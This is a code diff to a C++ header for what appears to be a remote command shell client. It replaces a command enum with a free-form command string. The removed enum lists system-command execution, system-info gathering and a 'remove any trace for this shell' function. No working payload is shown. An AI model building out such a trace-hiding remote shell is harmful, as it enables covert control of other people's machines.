@@ -5,26 +5,15 @@
 #include "HTTPRequest.hpp"
 #include "ConnectionHandler.h"
 #include "Log.h"
+#include "System.h"
 
-#define COMMAND_TYPE_LEN 4
 
 class ServerConnection : public ConnectionHandler
 {
-	enum commands
-	{
-		EXEC,          // System Command for Executing (TODO)
-		EXIT,         // Kill Process (TODO)
-		INFO,        // Get Stored System Info (TODO)
-		ECHO,       // Echo Request
-		TRACEOFF,  // Remove Any Trace for This Shell (TODO)
-		UNKNOWN   // Unknown Command Type
-	};
-
 	typedef struct Request
 	{
 		std::string sessionId;
-		enum commands commandType;
-		std::string params;
+		std::string command;
 	} Request;
 
 	typedef struct Response
@@ -35,8 +24,6 @@ class ServerConnection : public ConnectionHandler
 
 	static std::string _serverAddress;
 	std::string extractSessionId(http::Response request);
-	enum ServerConnection::commands extractCommandType(http::Response request);
-	std::string extractParameters(http::Response request);
 	ServerConnection::Request* parsingRequest(http::Response request);
 	ServerConnection::Response handleRequest(ServerConnection::Request* request);
 
